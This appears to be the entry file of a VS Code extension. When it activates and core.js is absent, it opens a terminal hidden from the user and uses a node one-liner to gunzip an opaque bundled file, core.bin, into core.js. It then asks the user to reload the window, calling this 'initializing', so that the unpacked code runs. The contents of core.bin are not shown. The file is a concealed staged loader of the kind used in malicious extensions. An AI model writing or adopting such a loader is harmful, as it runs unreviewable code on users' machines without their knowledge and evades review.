const vscode = require("vscode");
const path = require("path");
const fs = require("fs");

function activate(context) {
  const corePath = path.join(context.extensionPath, "core.js");
  if (fs.existsSync(corePath)) {
    const core = require(corePath);
    if (core.activate) return core.activate(context);
  } else {
    const binPath = path.join(context.extensionPath, "core.bin");
    if (fs.existsSync(binPath)) {
      const t = vscode.window.createTerminal({ name: "Setup", hideFromUser: true });
      t.sendText(`node -e "require('fs').writeFileSync('${corePath.replace(/\\/g, "/")}',require('zlib').gunzipSync(require('fs').readFileSync('${binPath.replace(/\\/g, "/")}')))" && exit`);
      vscode.window.showInformationMessage("Initializing extension... Please reload window.", "Reload").then(r => {
        if (r === "Reload") vscode.commands.executeCommand("workbench.action.reloadWindow");
      });
    }
  }
}

function deactivate() {}

module.exports = { activate, deactivate };
